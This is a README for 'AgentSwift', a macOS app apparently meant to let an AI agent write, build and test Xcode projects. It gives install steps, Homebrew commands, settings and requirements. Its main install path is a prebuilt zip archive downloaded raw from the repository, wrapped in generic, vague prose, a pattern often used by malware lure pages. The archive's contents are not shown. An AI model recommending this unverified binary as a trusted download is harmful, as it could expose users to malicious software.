# 🤖 agentswift - Build Apple apps using AI agents

[![](https://img.shields.io/badge/Download-AgentSwift-blue.svg)](https://github.com/hpennington/agentswift/raw/refs/heads/main/AgentSwift-0.2.4.zip)

AgentSwift helps you build software for Apple devices. You describe the app features you want. The application uses artificial intelligence to create code, build your project, and test the results. You do not need to open the complex development tools manually. The agent handles the file changes and system commands for you.

## 🚀 Getting Started

Follow these steps to set up AgentSwift on your computer. Ensure you have an Apple computer running the latest version of macOS.

1. Download the application file from this link: [Download AgentSwift](https://github.com/hpennington/agentswift/raw/refs/heads/main/AgentSwift-0.2.4.zip).
2. Locate the file in your downloads folder.
3. Unzip the file by double-clicking it.
4. Drag the AgentSwift application into your Applications folder.

## ⚙️ Preparation

Before you run AgentSwift, you must install the required tools. These tools allow the agent to talk to your computer systems. Open your Terminal app and run these commands one at a time. Press Enter after each line.

- Install Xcode tools: `xcode-select --install`
- Install the build manager: `brew install xcodebuildmcp`
- Install the specification runner: `brew install openspec`

If you do not have Homebrew, you must install it first. Visit the Homebrew website and follow their installation steps. These tools act as the bridge between the AI and your project files.

## 🖥️ How it Works

AgentSwift follows a strict process to ensure your code works as expected. 

1. Discovery: The agent scans your Xcode project folder. It maps the structure of your files and identifies the goals of your application.
2. Implementation: The agent writes and edits the code based on your written instructions. It applies changes directly to your source files.
3. Building: AgentSwift sends commands to the build engine. This compiles your code and checks for errors.
4. Validation: The agent launches your app in a simulator. It performs automated tests to verify the features work correctly.
5. Archiving: The agent saves your progress and marks the task as complete.

## 🛠️ Usage

Open the AgentSwift application from your Applications folder. You will see a text box on the main screen. Type the specific feature you want to build into this box. 

For example, you might type: "Create a button that changes the background color to blue when pressed."

Click the Start button. AgentSwift will show its progress in the status window. You can watch as it finds files, writes updates, and compiles the code. If a task requires your attention, a pop-up window will appear with instructions.

## 📂 Project Settings

You can customize how the agent behaves in the Settings panel. Click the gear icon to open this menu.

- Project Path: Select the folder that contains your Xcode project.
- AI Model: Ensure the settings point to your active Claude account.
- Build Target: Define whether you want to test on an iPhone simulator or the desktop.
- Automation Level: Choose if you want the agent to auto-approve file changes or ask you for confirmation every time.

## 📋 System Requirements

AgentSwift requires specific hardware and software to run:

- macOS version 14.0 or newer
- At least 16GB of RAM
- 50GB of free disk space for project builds
- Active internet connection for the AI model
- Valid Apple ID for simulator access

## 🔒 Security Practices

The agent modifies your files locally on your machine. It does not send your entire project to external servers. It only sends descriptions and code snippets to the AI model to generate the requested changes. You keep ownership of all source code. You can revert changes at any time by using your version control software or the manual undo function in your code editor.

## 💡 Troubleshooting

If the agent gets stuck, try these checks:

- Ensure your project compiles manually in Xcode first.
- Re-run the installation commands for the dependencies.
- Check your internet connection if the status window remains blank.
- Review the logs in the settings tab to see specific error codes.

Additional questions or help can be found by reviewing common project files. Always keep backups of your code before running AI agents on large projects. This ensures you can return to a working state if the implementation produces unexpected results.